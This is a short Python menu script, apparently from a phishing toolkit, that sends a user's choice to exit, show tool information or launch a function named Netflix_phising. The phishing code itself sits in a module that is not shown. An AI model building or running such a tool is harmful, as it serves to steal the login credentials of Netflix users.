import sys # For system stuffs
from rich import print # For color 

import Information # For information about tool
import Website # For Website stuffs 


def functional_menu(choice) :

    if(choice == 99) : # EXIT WAY
        print("[red][+] thanks for using my tool :)")
        sys.exit(0)
    
    if(choice == 00 or choice == 0) : # INFORMATION WAY
        Information.tool_information()

    if(choice == 1) : # NETFLIX WAY 
        Website.Netflix_phising()
    
    


    